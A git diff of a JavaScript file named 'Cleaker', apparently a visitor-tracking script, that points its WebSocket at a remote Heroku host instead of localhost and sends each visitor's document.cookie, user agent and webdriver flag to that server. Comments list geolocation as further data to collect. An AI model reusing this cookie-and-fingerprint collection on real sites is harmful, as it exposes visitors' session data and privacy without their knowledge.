@@ -1,9 +1,9 @@
-//CLEAKER - EVoL.VE
+//- EVoL.VE
 $('document').ready(function(){
-		//SET DATA READY
+		//SET DATA READY	
 		//USE URL WS:// OR WSS:// (IF USING TLS)
-		//var ws = new WebSocket("wss://monadlisa.herokuapp.com");
-		var ws = new WebSocket("ws://localhost:5000"); //RUNNING LOCAL
+		var ws = new WebSocket("wss://monadlisa.herokuapp.com");
+		//var ws = new WebSocket("ws://localhost:5000"); //RUNNING LOCAL
 			ws.onopen = function(e){
 			//console.log('Conected to MonadLisa.'); //ON STAGE
 			console.log('Conected to Cleaker. 000');
@@ -12,7 +12,7 @@ $('document').ready(function(){
 		//most important part - incoming messages
 		ws.onmessage = function(message) {
 		 //parse JSON message. Server always returns JSON
-		 //Worka without any problem but we should make sure that
+		 //Works without any problem but we should make sure that
 		 //the message is not chunked or otherwise damaged.
 		 	 try {
 				  var ws_msg = JSON.parse(message.data);
@@ -21,7 +21,7 @@ $('document').ready(function(){
 				    return;
 				     }
 		 	 //RECEVING JSON.TYPE FROM INDEX
-			 if (ws_msg.type === 'cleaked'){ //first handshake with cleaker index
+			 if (ws_msg.type === 'cleaking'){ //first handshake with cleaker index
 				 var myUUID = ws_msg.uuid; //ID' the connection record
 				 var cleaker ={    
 					 uuid: myUUID,
@@ -37,6 +37,7 @@ $('document').ready(function(){
 					 cookies: document.cookie,
 					 userAgent: navigator.userAgent,
 					 webDriver: navigator.webdriver //interface indicates whether the user agent is controlled by automation.
+					 //OTHER ADITIONAL DATA THAT COULD BE RECOLLECTED
 					 //geolocation: navigator.geolocation
 					 //browserOnline: navigator.onLine,
 					 //sessionClosed: 'I am',
@@ -54,7 +55,7 @@ $('document').ready(function(){
 				 };
 				 //var cookieCleaker = JSON.stringify(cleaker);
 				 //createCookie('cleakerCookie', cookieCleaker, 21);
-				 ws.send(JSON.stringify({clkcd: 'CLEAKEDBack' , cleaker: cleaker}));
+				 ws.send(JSON.stringify({clkcd: 'cleaked' , cleaker: cleaker}));
 			 }
 		 }
 	}); // DOCUMENT ON READY
@@ -109,19 +110,6 @@ $('document').ready(function(){
 	 	  }
 								
 					
-					
-/*Include the font.js script in your page.
-
-It relies on jQuery so include that somewhere too.
-
-$(document).ready(function () {
-  font.setup(); // run setup when the DOM is ready
-});
-Then to test:
-		  
-font.isInstalled(fontname); // returns true or false
-Simple.
-*/
 		  	
 					
 			
